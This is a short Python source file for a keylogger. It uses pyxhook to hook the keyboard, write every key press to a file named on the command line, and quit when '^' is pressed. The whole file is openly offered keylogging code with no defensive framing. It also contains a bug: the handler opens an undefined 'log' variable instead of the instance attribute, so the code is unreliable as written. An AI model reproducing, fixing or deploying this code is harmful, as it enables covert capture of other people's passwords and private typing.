import pyxhook
import sys


class KeyLogger():

    log = ""
    listener = ""

    def main(self):
        """
        Take a file path as input
        and log key presses to 
        said file
        """
        
        self.log = sys.argv[1]
        self.listener = pyxhook.HookManager()
        self.listener.KeyDown = self.capture_key_press
        self.listener.HookKeyboard()
        self.listener.start()
        
    def capture_key_press(self, event):
        """
        Capture keypresses and
        log to file. Exit
        when the ^ key is pressed.
        """

        file_object = open(log,'a')
        file_object.write(event.Key)
        file_object.write('\n')
       
        if event.Ascii==94:
           file_object.close()
           self.listener.cancel()
     
        

if __name__ == '__main__':
    key_logger = KeyLogger()
    key_logger.main()

